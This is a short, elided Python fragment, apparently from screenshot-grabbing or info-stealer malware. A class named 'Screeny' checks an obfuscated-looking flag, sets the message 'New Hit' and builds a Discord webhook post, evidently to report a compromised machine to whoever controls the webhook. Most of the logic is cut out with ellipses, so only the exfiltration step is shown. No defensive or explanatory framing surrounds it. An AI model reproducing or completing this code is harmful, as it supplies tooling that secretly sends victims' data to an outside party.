class Screeny:
    ...
    def __init__(self):
        ...
        if jtjirjihirthr:
            ...
            content = "New Hit"
        webhook = DiscordWebhook(url=wbh, username="/comps", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png",content=content)
